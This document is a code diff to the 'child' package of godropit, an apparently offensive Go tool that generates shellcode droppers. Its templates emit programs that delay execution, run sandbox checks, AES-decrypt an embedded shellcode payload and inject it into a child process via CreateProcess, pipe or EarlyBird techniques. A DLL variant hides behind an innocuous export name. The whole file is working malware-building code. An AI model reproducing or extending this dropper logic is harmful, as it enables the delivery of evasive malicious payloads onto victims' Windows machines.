@@ -1,8 +1,9 @@
 package child
 
 import (
-	"html/template"
 	"io"
+	"log"
+	"text/template"
 
 	"github.com/Epictetus24/godropit/pkg/dropfmt"
 )
@@ -10,49 +11,46 @@ import (
 var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}
 
 type ChildDropper struct {
-	Funcname  string //FileName
-	FileName  string
-	KeyStr    string //Key
-	Bufstr    string //Base64Shellcodestr
-	ChildProc string //Program Proc to Execute in
-	Args      string //Args to pass to shellcode exec
-	Int       string
-	Delay     int
-	Dlls      string
-	BoxChk    string
-	Inject    string
-	Export    string
-	Domain    string
-	Import    string
+	FuncName   string
+	FileName   string
+	KeyStr     string //EncryptionKey
+	BufStr     string //Base64Shellcodestr
+	ChildProc  string //Program Proc to Execute in
+	Args       string //Args to pass to shellcode exec
+	Delay      int
+	Dlls       string
+	BoxChkFunc string
+	BoxChkImp  string
+	ChkBox     string
+	Inject     string
+	Export     string
+	Domain     string
+	Import     string
+	C          string
 }
 
-const ChildImports = `import (
-	"fmt"
-	
-	"log"
-	"os"
-	"syscall"
-	"time"
-	"unsafe"
-	"{{.C}}"
-
-	// Sub Repositories
-	"golang.org/x/sys/windows"
-	"github.com/Epictetus24/godropit/pkg/box"
-)`
-
-var FuncName = "Init"
+var FuncName = "checkData"
 var Export = "export"
 
-const ChildMain = `
-package main
+const ChildMain = `package main
 
-{{.Import}}
+import (
+	{{.Import}}
+	{{.C}}
+	{{.BoxChkImp}}
+
+)
+var hope = "{{.Domain}}"
+
+{{.BoxChkFunc}}
+
 func init() {
-	{{.BoxChk}}
+	{{.ChkBox}}	
 }
 func main() {
+
 	{{.FuncName}}()
+
 }
 
 //{{.Export}} {{.FuncName}}
@@ -61,12 +59,13 @@ func {{.FuncName}}() {
 	program := "{{.ChildProc}}"
 	args := "{{.Args}}"
 
-	bufstring := "{{.Bufstr}}"
+	bufstring := "{{.BufStr}}"
 	kstring := "{{.KeyStr}}"
+	time.Sleep({{.Delay}}* time.Second)
 
 	shellcode, err := box.AESDecrypt(kstring, bufstring)
 	if err != nil {
-		time.Sleep({{.Delay}} * time.Second)
+		time.Sleep({{.Delay}}* time.Second)
 		os.Exit(0)
 	}
 	{{.Dlls}}
@@ -78,11 +77,13 @@ func {{.FuncName}}() {
 func (cd *ChildDropper) WriteSrc(writer io.Writer) error {
 	tmpl, err := template.New("child").Parse(ChildMain)
 	if err != nil {
+		log.Fatalf("[child] Error writing template: %v\n", err)
 		return err
 	}
-	cd.Import = ChildImports
-	cd.Funcname = FuncName
+	cd.FuncName = FuncName
 	cd.Export = ""
+	cd.C = ""
+
 	err = tmpl.Execute(writer, cd)
 	return nil
 
@@ -93,8 +94,8 @@ func (cd *ChildDropper) WriteSharedSrc(writer io.Writer) error {
 	if err != nil {
 		return err
 	}
-	cd.Import = ChildImports
-	cd.Funcname = FuncName
+	cd.C = `"C"`
+	cd.FuncName = FuncName
 	cd.Export = Export
 	err = tmpl.Execute(writer, cd)
 	return nil
@@ -113,12 +114,15 @@ func NewChild(args, proc, domain string, delay int) ChildDropper {
 	case "CreateProcess":
 		cD.Dlls = CreateProcessDlls
 		cD.Inject = CreateProcess
+		cD.Import = CreateProcessImports
 	case "CreateProcessWithPipe":
 		cD.Dlls = CreateProcWithPipeDlls
 		cD.Inject = CreateProcWithPipe
+		cD.Import = CreateProcWithPipeImports
 	case "EarlyBird":
 		cD.Dlls = EarlyBirdDlls
 		cD.Inject = EarlyBird
+		cD.Import = EarlyBirdImports
 	}
 
 	return cD
